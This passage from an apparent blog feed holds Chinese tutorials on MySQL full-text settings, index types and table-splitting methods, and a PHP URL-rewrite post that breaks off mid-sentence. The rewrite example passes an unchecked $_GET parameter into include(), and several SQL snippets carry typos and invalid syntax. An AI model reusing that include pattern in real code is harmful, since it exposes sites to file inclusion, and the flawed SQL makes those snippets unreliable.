GWS_PROB<br>改为：</p><p>#define GWS_IN_USE GWS_FREQ<br>然后重新编译 MySQL。在这种情况下，不需要重建索引。 注意：使用了这个，将严重地减少 MySQL 为 MATCH() 提供足够的相似性值的能力。如果你确实需要搜索这样的公共词，最好使用 IN BOOLEAN MODE 的搜索代替，它不遵守 50% 的阈值。<br>有时，搜索引擎维护员希望更改使用于逻辑全文搜索的操作符。这些由变量 ft_boolean_syntax 定义。 查看章节 4.5.6.4 SHOW VARIABLES。 然而，这个变量是只读的，它的值在 `myisam/ft_static.c’ 中被设置。<br>对于这些更改，要求你重建你的 FULLTEXT 索引，对于一个 MyISAM 表，最容易的重建索引文件的方式如下面的语句：</p><p>mysql&gt; REPAIR TABLE tbl_name QUICK;<br>6.8.3 全文搜索 TODO</p><p>使所有对 FULLTEXT 索引的操作更快<br>邻近(Proximity)操作符<br>对 “always-index words” 的支持。他们可以是用户希望视为一个词处理的任意字符串，例如 “C++”、”AS/400”、”TCP/IP”，等等<br>支持在 MERGE 表中的全文搜索<br>对多字节字符的支持<br>依照数据的语言建立 stopword 列表<br>Stemming (当然，依赖于数据的语言)<br>Generic user-suppliable UDF preparser.<br>使模式更加灵活 (通过为 CREATE/ALTER TABLE 中的 FULLTEXT 增加某些可调整参数)</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL索引类型一览 让MySQL高效运行起来</title>
      <link href="/2013/01/06/mysql/MySQL%E7%B4%A2%E5%BC%95%E7%B1%BB%E5%9E%8B%E4%B8%80%E8%A7%88%20%E8%AE%A9MySQL%E9%AB%98%E6%95%88%E8%BF%90%E8%A1%8C%E8%B5%B7%E6%9D%A5/"/>
      <url>/2013/01/06/mysql/MySQL%E7%B4%A2%E5%BC%95%E7%B1%BB%E5%9E%8B%E4%B8%80%E8%A7%88%20%E8%AE%A9MySQL%E9%AB%98%E6%95%88%E8%BF%90%E8%A1%8C%E8%B5%B7%E6%9D%A5/</url>
      
        <content type="html"><![CDATA[<p>索引是快速搜索的关键。MySQL索引的建立对于MySQL的高效运行是很重要的。下面介绍几种常见的MySQL索引类型。</p><p>在数据库表中，对字段建立索引可以大大提高查询速度。假如我们创建了一个 mytable表：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mytable(  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">ID</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,   </span><br><span class="line"> </span><br><span class="line">username <span class="built_in">VARCHAR</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> </span><br><span class="line"> </span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>我们随机向里面插入了10000条记录，其中有一条：5555, admin。</p><p>在查找username=”admin”的记录 SELECT * FROM mytable WHERE username=’admin’;时，如果在username上已经建立了索引，MySQL无须任何扫描，即准确可找到该记录。相反，MySQL会扫描所有记录，即要查询10000条记录。</p><p>索引分单列索引和组合索引。单列索引，即一个索引只包含单个列，一个表可以有多个单列索引，但这不是组合索引。组合索引，即一个索包含多个列。</p><p>MySQL索引类型包括：</p><p>（1）普通索引</p><p>这是最基本的索引，它没有任何限制。它有以下几种创建方式：</p><p>◆创建索引</p><p>CREATE INDEX indexName ON mytable(username(length));<br>如果是CHAR，VARCHAR类型，length可以小于字段实际长度；如果是BLOB和TEXT类型，必须指定 length，下同。</p><p>◆修改表结构</p><p>ALTER mytable ADD INDEX [indexName] ON (username(length))<br>◆创建表的时候直接指定</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mytable(  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">ID</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,   </span><br><span class="line"> </span><br><span class="line">username <span class="built_in">VARCHAR</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">INDEX</span> [indexName] (username(<span class="keyword">length</span>))  </span><br><span class="line"> </span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>删除索引的语法：</p><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> [indexName] <span class="keyword">ON</span> mytable;</span><br></pre></td></tr></table></figure><p>（2）唯一索引</p><p>它与前面的普通索引类似，不同的就是：索引列的值必须唯一，但允许有空值。如果是组合索引，则列值的组合必须唯一。它有以下几种创建方式：</p><p>◆创建索引</p><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> indexName <span class="keyword">ON</span> mytable(username(<span class="built_in">length</span>))</span><br></pre></td></tr></table></figure><p>◆修改表结构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> mytable <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> [indexName] <span class="keyword">ON</span> (username(<span class="keyword">length</span>))</span><br></pre></td></tr></table></figure><p>◆创建表的时候直接指定</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mytable(  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">ID</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,   </span><br><span class="line"> </span><br><span class="line">username <span class="built_in">VARCHAR</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">UNIQUE</span> [indexName] (username(<span class="keyword">length</span>))  </span><br><span class="line"> </span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>（3）主键索引</p><p>它是一种特殊的唯一索引，不允许有空值。一般是在建表的时候同时创建主键索引：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mytable(  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">ID</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,   </span><br><span class="line"> </span><br><span class="line">username <span class="built_in">VARCHAR</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,  </span><br><span class="line"> </span><br><span class="line">PRIMARY <span class="keyword">KEY</span>(<span class="keyword">ID</span>)  </span><br><span class="line"> </span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>当然也可以用 ALTER 命令。记住：一个表只能有一个主键。</p><p>（4）组合索引</p><p>为了形象地对比单列索引和组合索引，为表添加多个字段：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mytable(  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">ID</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,   </span><br><span class="line"> </span><br><span class="line">username <span class="built_in">VARCHAR</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,  </span><br><span class="line"> </span><br><span class="line">city <span class="built_in">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,  </span><br><span class="line"> </span><br><span class="line">age <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> </span><br><span class="line"> </span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>为了进一步榨取MySQL的效率，就要考虑建立组合索引。就是将 name, city, age建到一个索引里：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> mytable <span class="keyword">ADD</span> <span class="keyword">INDEX</span> name_city_age (<span class="keyword">name</span>(<span class="number">10</span>),city,age);</span><br></pre></td></tr></table></figure><p>建表时，usernname长度为 16，这里用 10。这是因为一般情况下名字的长度不会超过10，这样会加速索引查询速度，还会减少索引文件的大小，提高INSERT的更新速度。</p><p>如果分别在 usernname，city，age上建立单列索引，让该表有3个单列索引，查询时和上述的组合索引效率也会大不一样，远远低于我们的组合索引。虽然此时有了三个索引，但MySQL只能用到其中的那个它认为似乎是最有效率的单列索引。</p><p>建立这样的组合索引，其实是相当于分别建立了下面三组组合索引：</p><p>usernname,city,age  </p><p>usernname,city  </p><p>usernname<br>为什么没有 city，age这样的组合索引呢？这是因为MySQL组合索引“最左前缀”的结果。简单的理解就是只从最左面的开始组合。并不是只要包含这三列的查询都会用到该组合索引，下面的几个SQL就会用到这个组合索引：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span> mytable WHREE <span class="attribute">username</span>=<span class="string">"admin"</span> <span class="keyword">AND</span> <span class="attribute">city</span>=<span class="string">"郑州"</span> </span><br><span class="line"> </span><br><span class="line">SELECT * <span class="keyword">FROM</span> mytable WHREE <span class="attribute">username</span>=<span class="string">"admin"</span> </span><br><span class="line">而下面几个则不会用到：</span><br><span class="line"></span><br><span class="line">SELECT * <span class="keyword">FROM</span> mytable WHREE <span class="attribute">age</span>=20 <span class="keyword">AND</span> <span class="attribute">city</span>=<span class="string">"郑州"</span> </span><br><span class="line"> </span><br><span class="line">SELECT * <span class="keyword">FROM</span> mytable WHREE <span class="attribute">city</span>=<span class="string">"郑州"</span></span><br></pre></td></tr></table></figure><p>（5）建立索引的时机</p><p>到这里我们已经学会了建立索引，那么我们需要在什么情况下建立索引呢？一般来说，在WHERE和JOIN中出现的列需要建立索引，但也不完全如此，因为MySQL只对&lt;，&lt;=，=，&gt;，&gt;=，BETWEEN，IN，以及某些时候的LIKE才会使用索引。例如：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">SELECT t.Name </span><br><span class="line"> </span><br><span class="line"><span class="keyword">FROM</span> mytable t LEFT JOIN mytable m   </span><br><span class="line"> </span><br><span class="line">ON t.<span class="attribute">Name</span>=m.username WHERE m.<span class="attribute">age</span>=20 <span class="keyword">AND</span> m.<span class="attribute">city</span>=<span class="string">'郑州'</span></span><br></pre></td></tr></table></figure><p>此时就需要对city和age建立索引，由于mytable表的userame也出现在了JOIN子句中，也有对它建立索引的必要。</p><p>刚才提到只有某些时候的LIKE才需建立索引。因为在以通配符%和_开头作查询时，MySQL不会使用索引。例如下句会使用索引：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> mytable <span class="keyword">WHERE</span> username <span class="keyword">like</span><span class="string">'admin%'</span> </span><br><span class="line">而下句就不会使用：</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> mytable WHEREt <span class="keyword">Name</span> <span class="keyword">like</span><span class="string">'%admin'</span></span><br></pre></td></tr></table></figure><p>因此，在使用LIKE时应注意以上的区别。</p><p>（6）索引的不足之处</p><p>上面都在说使用索引的好处，但过多的使用索引将会造成滥用。因此索引也会有它的缺点：</p><p>◆虽然索引大大提高了查询速度，同时却会降低更新表的速度，如对表进行INSERT、UPDATE和DELETE。因为更新表时，MySQL不仅要保存数据，还要保存一下索引文件。</p><p>◆建立索引会占用磁盘空间的索引文件。一般情况这个问题不太严重，但如果你在一个大表上创建了多种组合索引，索引文件的会膨胀很快。</p><p>索引只是提高效率的一个因素，如果你的MySQL有大数据量的表，就需要花时间研究建立最优秀的索引，或优化查询语句。</p><p>（7）使用索引的注意事项</p><p>使用索引时，有以下一些技巧和注意事项：</p><p>◆索引不会包含有NULL值的列</p><p>只要列中包含有NULL值都将不会被包含在索引中，复合索引中只要有一列含有NULL值，那么这一列对于此复合索引就是无效的。所以我们在数据库设计时不要让字段的默认值为NULL。</p><p>◆使用短索引</p><p>对串列进行索引，如果可能应该指定一个前缀长度。例如，如果有一个CHAR(255)的列，如果在前10个或20个字符内，多数值是惟一的，那么就不要对整个列进行索引。短索引不仅可以提高查询速度而且可以节省磁盘空间和I/O操作。</p><p>◆索引列排序</p><p>MySQL查询只使用一个索引，因此如果where子句中已经使用了索引的话，那么order by中的列是不会使用索引的。因此数据库默认排序可以符合要求的情况下不要使用排序操作；尽量不要包含多个列的排序，如果需要最好给这些列创建复合索引。</p><p>◆like语句操作</p><p>一般情况下不鼓励使用like操作，如果非使用不可，如何使用也是一个问题。like “%aaa%” 不会使用索引而like “aaa%”可以使用索引。</p><p>◆不要在列上进行运算</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where YEAR(adddate)&lt;2007;</span><br></pre></td></tr></table></figure><p>将在每个行上进行运算，这将导致索引失效而进行全表扫描，因此我们可以改成</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where adddate&lt;‘2007-01-01’;</span><br></pre></td></tr></table></figure><p>◆不使用NOT IN和&lt;&gt;操作</p><p>以上，就对其中MySQL索引类型进行了介绍。</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql分表的3种方法</title>
      <link href="/2013/01/04/mysql/mysql%E5%88%86%E8%A1%A8%E7%9A%843%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
      <url>/2013/01/04/mysql/mysql%E5%88%86%E8%A1%A8%E7%9A%843%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>一，先说一下为什么要分表<br>当一张的数据达到几百万时，你查询一次所花的时间会变多，如果有联合查询的话，我想有可能会死在那儿了。分表的目的就在于此，减小数据库的负担，缩短查询时间。<br>根据个人经验，mysql执行一个sql的过程如下：<br>1,接收到sql;2,把sql放到排队队列中 ;3,执行sql;4,返回执行结果。在这个执行过程中最花时间在什么地方呢？第一，是排队等待的时间，第二，sql的执行时间。其实这二个是一回事，等待的同时，肯定有sql在执行。所以我们要缩短sql的执行时间。<br>mysql中有一种机制是表锁定和行锁定，为什么要出现这种机制，是为了保证数据的完整性，我举个例子来说吧，如果有二个sql都要修改同一张表的同一条数据，这个时候怎么办呢，是不是二个sql都可以同时修改这条数据呢？很显然mysql对这种情况的处理是，一种是表锁定（myisam存储引擎），一个是行锁定（innodb存储引擎）。表锁定表示你们都不能对这张表进行操作，必须等我对表操作完才行。行锁定也一样，别的sql必须等我对这条数据操作完了，才能对这条数据进行操作。如果数据太多，一次执行的时间太长，等待的时间就越长，这也是我们为什么要分表的原因。<br>二，分表<br>1，做mysql集群，例如：利用mysql cluster ，mysql proxy，mysql replication，drdb等等<br>有人会问mysql集群，根分表有什么关系吗？虽然它不是实际意义上的分表，但是它启到了分表的作用，做集群的意义是什么呢？为一个数据库减轻负担，说白了就是减少sql排队队列中的sql的数量，举个例子：有10个sql请求，如果放在一个数据库服务器的排队队列中，他要等很长时间，如果把这10个sql请求，分配到5个数据库服务器的排队队列中，一个数据库服务器的队列中只有2个，这样等待时间是不是大大的缩短了呢？这已经很明显了。所以我把它列到了分表的范围以内，我做过一些mysql的集群：<br>linux mysql proxy 的安装，配置，以及读写分离<br>mysql replication 互为主从的安装及配置，以及数据同步<br>优点：扩展性好，没有多个分表后的复杂操作（php代码）<br>缺点：单个表的数据量还是没有变，一次操作所花的时间还是那么多，硬件开销大。<br>2，预先估计会出现大数据量并且访问频繁的表，将其分为若干个表<br>这种预估大差不差的，论坛里面发表帖子的表，时间长了这张表肯定很大，几十万，几百万都有可能。 聊天室里面信息表，几十个人在一起一聊一个晚上，时间长了，这张表的数据肯定很大。像这样的情况很多。所以这种能预估出来的大数据量表，我们就事先分出个N个表，这个N是多少，根据实际情况而定。以聊天信息表为例：<br>我事先建100个这样的表，message_00,message_01,message_02……….message_98,message_99.然后根据用户的ID来判断这个用户的聊天信息放到哪张表里面，你可以用hash的方式来获得，可以用求余的方式来获得，方法很多，各人想各人的吧。下面用hash的方法来获得表名：<br>查看复制打印?</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">get_hash_table</span><span class="params">($table,$userid)</span> </span>&#123;  </span></span><br><span class="line"><span class="php"> $str = crc32($userid);  </span></span><br><span class="line"><span class="php"> <span class="keyword">if</span>($str&lt;<span class="number">0</span>)&#123;  </span></span><br><span class="line"><span class="php"> $hash = <span class="string">"0"</span>.substr(abs($str), <span class="number">0</span>, <span class="number">1</span>);  </span></span><br><span class="line"><span class="php"> &#125;<span class="keyword">else</span>&#123;  </span></span><br><span class="line"><span class="php"> $hash = substr($str, <span class="number">0</span>, <span class="number">2</span>);  </span></span><br><span class="line"><span class="php"> &#125;  </span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php"> <span class="keyword">return</span> $table.<span class="string">"_"</span>.$hash;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> get_hash_table(<span class="string">'message'</span>,<span class="string">'user18991'</span>);     <span class="comment">//结果为message_10  </span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> get_hash_table(<span class="string">'message'</span>,<span class="string">'user34523'</span>);    <span class="comment">//结果为message_13  </span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>说明一下，上面的这个方法，告诉我们user18991这个用户的消息都记录在message_10这张表里，user34523这个用户的消息都记录在message_13这张表里，读取的时候，只要从各自的表中读取就行了。<br>优点：避免一张表出现几百万条数据，缩短了一条sql的执行时间<br>缺点：当一种规则确定时，打破这条规则会很麻烦，上面的例子中我用的hash算法是crc32，如果我现在不想用这个算法了，改用md5后，会使同一个用户的消息被存储到不同的表中，这样数据乱套了。扩展性很差。<br>3，利用merge存储引擎来实现分表<br>我觉得这种方法比较适合，那些没有事先考虑，而已经出现了得，数据查询慢的情况。这个时候如果要把已有的大数据量表分开比较痛苦，最痛苦的事就是改代码，因为程序里面的sql语句已经写好了，现在一张表要分成几十张表，甚至上百张表，这样sql语句是不是要重写呢？举个例子，我很喜欢举子<br>mysql&gt;show engines;的时候你会发现mrg_myisam其实就是merge。</p><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">CREATE</span> TABLE <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="symbol">`user1`</span> (  </span><br><span class="line"> -&gt;   <span class="symbol">`id`</span> int(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,  </span><br><span class="line"> -&gt;   <span class="symbol">`name`</span> varchar(<span class="number">50</span>) DEFAULT <span class="literal">NULL</span>,  </span><br><span class="line"> -&gt;   <span class="symbol">`sex`</span> int(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> DEFAULT <span class="string">'0'</span>,  </span><br><span class="line"> -&gt;   <span class="keyword">PRIMARY</span> <span class="keyword">KEY</span> (<span class="symbol">`id`</span>)  </span><br><span class="line"> -&gt; ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=<span class="number">1</span> ;  </span><br><span class="line">Query OK, 0 rows affected (0.05 sec)  </span><br><span class="line">  </span><br><span class="line">mysql&gt; <span class="keyword">CREATE</span> TABLE <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="symbol">`user2`</span> (  </span><br><span class="line"> -&gt;   <span class="symbol">`id`</span> int(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,  </span><br><span class="line"> -&gt;   <span class="symbol">`name`</span> varchar(<span class="number">50</span>) DEFAULT <span class="literal">NULL</span>,  </span><br><span class="line"> -&gt;   <span class="symbol">`sex`</span> int(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> DEFAULT <span class="string">'0'</span>,  </span><br><span class="line"> -&gt;   <span class="keyword">PRIMARY</span> <span class="keyword">KEY</span> (<span class="symbol">`id`</span>)  </span><br><span class="line"> -&gt; ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=<span class="number">1</span> ;  </span><br><span class="line">Query OK, 0 rows affected (0.01 sec)  </span><br><span class="line">  </span><br><span class="line">mysql&gt; <span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="symbol">`user1`</span> (<span class="symbol">`name`</span>, <span class="symbol">`sex`</span>) <span class="keyword">VALUES</span>(<span class="string">'张映'</span>, <span class="number">0</span>);  </span><br><span class="line">Query OK, 1 row affected (0.00 sec)  </span><br><span class="line">  </span><br><span class="line">mysql&gt; <span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="symbol">`user2`</span> (<span class="symbol">`name`</span>, <span class="symbol">`sex`</span>) <span class="keyword">VALUES</span>(<span class="string">'tank'</span>, <span class="number">1</span>);  </span><br><span class="line">Query OK, 1 row affected (0.00 sec)  </span><br><span class="line">  </span><br><span class="line">mysql&gt; <span class="keyword">CREATE</span> TABLE <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="symbol">`alluser`</span> (  </span><br><span class="line"> -&gt;   <span class="symbol">`id`</span> int(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,  </span><br><span class="line"> -&gt;   <span class="symbol">`name`</span> varchar(<span class="number">50</span>) DEFAULT <span class="literal">NULL</span>,  </span><br><span class="line"> -&gt;   <span class="symbol">`sex`</span> int(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> DEFAULT <span class="string">'0'</span>,  </span><br><span class="line"> -&gt;   <span class="keyword">INDEX</span>(id)  </span><br><span class="line"> -&gt; ) <span class="built_in">TYPE</span>=<span class="keyword">MERGE</span> <span class="keyword">UNION</span>=(user1,user2) INSERT_METHOD=<span class="keyword">LAST</span> AUTO_INCREMENT=<span class="number">1</span> ;  </span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)  </span><br><span class="line">  </span><br><span class="line">mysql&gt; <span class="keyword">select</span> id,name,sex <span class="keyword">from</span> alluser;  </span><br><span class="line">+----+--------+-----+  </span><br><span class="line">| id | name   | sex |  </span><br><span class="line">+----+--------+-----+  </span><br><span class="line">|  1 | 张映 |   0 |  </span><br><span class="line">|  1 | tank   |   1 |  </span><br><span class="line">+----+--------+-----+  </span><br><span class="line">2 rows in set (0.00 sec)  </span><br><span class="line">  </span><br><span class="line">mysql&gt; <span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="symbol">`alluser`</span> (<span class="symbol">`name`</span>, <span class="symbol">`sex`</span>) <span class="keyword">VALUES</span>(<span class="string">'tank2'</span>, <span class="number">0</span>);  </span><br><span class="line">Query OK, 1 row affected (0.00 sec)  </span><br><span class="line">  </span><br><span class="line">mysql&gt; <span class="keyword">select</span> id,name,sex <span class="keyword">from</span> user2  </span><br><span class="line"> -&gt; ;  </span><br><span class="line">+----+-------+-----+  </span><br><span class="line">| id | name  | sex |  </span><br><span class="line">+----+-------+-----+  </span><br><span class="line">|  1 | tank  |   1 |  </span><br><span class="line">|  2 | tank2 |   0 |  </span><br><span class="line">+----+-------+-----+  </span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>从上面的操作中，我不知道你有没有发现点什么？假如我有一张用户表user，有50W条数据，现在要拆成二张表user1和user2，每张表25W条数据，</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">INSERT INTO user1(user1.id,user1.name,user1.sex)SELECT (user.id,user.name,user.sex)<span class="keyword">FROM</span><span class="built_in"> user </span>where user.id &lt;= 250000</span><br><span class="line">INSERT INTO user2(user2.id,user2.name,user2.sex)SELECT (user.id,user.name,user.sex)<span class="keyword">FROM</span><span class="built_in"> user </span>where user.id &gt; 250000</span><br></pre></td></tr></table></figure><p>这样我就成功的将一张user表，分成了二个表，这个时候有一个问题，代码中的sql语句怎么办，以前是一张表，现在变成二张表了，代码改动很大，这样给程序员带来了很大的工作量，有没有好的办法解决这一点呢？办法是把以前的user表备份一下，然后删除掉，上面的操作中我建立了一个alluser表，只把这个alluser表的表名改成user就行了。但是，不是所有的mysql操作都能用的<br>a，如果你使用 alter table 来把 merge 表变为其它表类型，到底层表的映射就被丢失了。取而代之的，来自底层 myisam 表的行被复制到已更换的表中，该表随后被指定新类型。<br>b，网上看到一些说replace不起作用，我试了一下可以起作用的。晕一个先</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">mysql&gt; UPDATE alluser SET sex=REPLACE(sex, 0, 1) where id=2;  </span><br><span class="line">Query OK, 1 row affected (0.00 sec)  </span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0  </span><br><span class="line">  </span><br><span class="line">mysql&gt; select <span class="symbol">*</span> from alluser;  </span><br><span class="line">+----+--------+-----+  </span><br><span class="line">|<span class="string"> id </span>|<span class="string"> name   </span>|<span class="string"> sex </span>|<span class="string">  </span></span><br><span class="line"><span class="string">+----+--------+-----+  </span></span><br><span class="line">|<span class="string">  1 </span>|<span class="string"> 张映 </span>|<span class="string">   0 </span>|<span class="string">  </span></span><br><span class="line">|<span class="string">  1 </span>|<span class="string"> tank   </span>|<span class="string">   1 </span>|<span class="string">  </span></span><br><span class="line">|<span class="string">  2 </span>|<span class="string"> tank2  </span>|<span class="string">   1 </span>|<span class="string">  </span></span><br><span class="line"><span class="string">+----+--------+-----+  </span></span><br><span class="line"><span class="string">3 rows in set (0.00 sec)</span></span><br></pre></td></tr></table></figure><p>c，一个 merge 表不能在整个表上维持 unique 约束。当你执行一个 insert，数据进入第一个或者最后一个 myisam 表（取决于 insert_method 选项的值）。mysql 确保唯一键值在那个 myisam 表里保持唯一，但不是跨集合里所有的表。<br>d,当你创建一个 merge 表之时，没有检查去确保底层表的存在以及有相同的机构。当 merge 表被使用之时，mysql 检查每个被映射的表的记录长度是否相等，但这并不十分可靠。如果你从不相似的 myisam 表创建一个 merge 表，你非常有可能撞见奇怪的问题。<br>好困睡觉了，c和d在网上看到的，没有测试，大家试一下吧。<br>优点：扩展性好，并且程序代码改动的不是很大<br>缺点：这种方法的效果比第二种要差一点<br>三，总结一下<br>上面提到的三种方法，我实际做过二种，第一种和第二种。第三种没有做过，所以说的细一点。哈哈。做什么事都有一个度，超过个度就过变得很差，不能一味的做数据库服务器集群，硬件是要花钱买的，也不要一味的分表，分出来1000表，mysql的存储归根到底还以文件的形势存在硬盘上面，一张表对应三个文件，1000个分表就是对应3000个文件，这样检索起来也会变的很慢。我的建议是<br>方法1和方法2结合的方式来进行分表<br>方法1和方法3结合的方式来进行分表<br>我的二个建议适合不同的情况，根据个人情况而定，我觉得会有很多人选择方法1和方法3结合的方式</p><p>转载自：<a href="http://blog.51yip.com/mysql/949.html" target="_blank" rel="noopener">http://blog.51yip.com/mysql/949.html</a></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php URL重写</title>
      <link href="/2012/12/18/php/php%20URL%E9%87%8D%E5%86%99/"/>
      <url>/2012/12/18/php/php%20URL%E9%87%8D%E5%86%99/</url>
      
        <content type="html"><![CDATA[<p>话说重写：<br>网站结构如下：<br>index.php<br>source/src_{模块名}.php<br>template/tpl_{模块名}.php<br>通过首页统一入口来访问各个模块文件，<br>比如，最简单的统一入口访问代码：<br>define(‘ROOT’, dirname(<strong>FILE</strong>));<br>$mod = isset($<em>GET[‘mod’]) ? $_GET[‘mod’] : ‘index’;<br>$src = ROOT . ‘source/src</em>‘ . $mod . ‘.php’ ;<br>$tpl = ROOT . ‘template/src_’ . $mod . ‘.php’ ;<br>file_exists($src) &amp;&amp; include($src) ;<br>file_exists($tpl) &amp;&amp; include($tpl) ;<br>现在访问一个地址：index.php?mod=news ；则会访问source/src_news.php 文件。<br>现在要让url重写，访问 /news 这个url能实现一样的效果,<br>Linux下的Apache和Nginx，<br>windows下的ISAPI_Rewrite模块重写，<br>重写要求，如果我访问的是不存在的文件，重定向到index.php，通过获取实际访问的url，来判断该调用哪个文件，如果我访问 /news?page=1 这个URL，重定向后：<br>三个服务器访问后的结果：<br>Apache 关于开启rewrite模块后，会产生三个头部：<br>$_SERVER[‘REDIRECT_STATUS’] =&gt; 200 （证明重写成功）<br>$_SERVER[‘REDIRECT_QUERY_STRING’] =&gt; page=1<br>$_SERVER[‘REDIRECT_URL’] =&gt; /news<br>而IIS的rewrite模块重写后，会有<br>$_SERVER[‘REDIRECT_STATUS’] =&gt; 200<br>$_SERVER[‘HTTP_X_REWRITE_URL’] =&gt; /news<br>Nginx重写后有：<br>$_SERVER[‘REDIRECT_STATUS’] =&gt; 200<br>所以，如果采用 $_SERVER[‘REDIRECT_URL’] 或 $_SERVER[‘HTTP_X_REWRITE_URL’]都是不可取的，因为Nginx重写后，不产生重写URL，三个服务器并没有交集，如果还考虑其他服务器比如 lighttpd，cheroke等，可能产生的头部更加不一致。<br>通常需要考虑的就是PHP的 $_SERVER[‘REQUEST_URI’]<br>现在看看这几个服务器产生的 REQUEST_URI是否一致：<br>apache下：<br>$_SERVER[‘REQUEST_URI’] =&gt; /news<br>Nginx下：<br>$_SERVER[‘REQUEST_URI’] =&gt; /news<br>IIS下：<br>$_SERVER[‘REQUEST_URI’] =&gt; /index.php/news<br>这他妈是怎么回事？干嘛加个/index.php这个玩意呢？我没有搞懂，不过IIS的重写不完全支持.htaccess语法，所以，不知道是否是我配置的问题，但是我绞尽脑汁也弄不掉这个/index.php<br>所以，干脆用IIS专用的 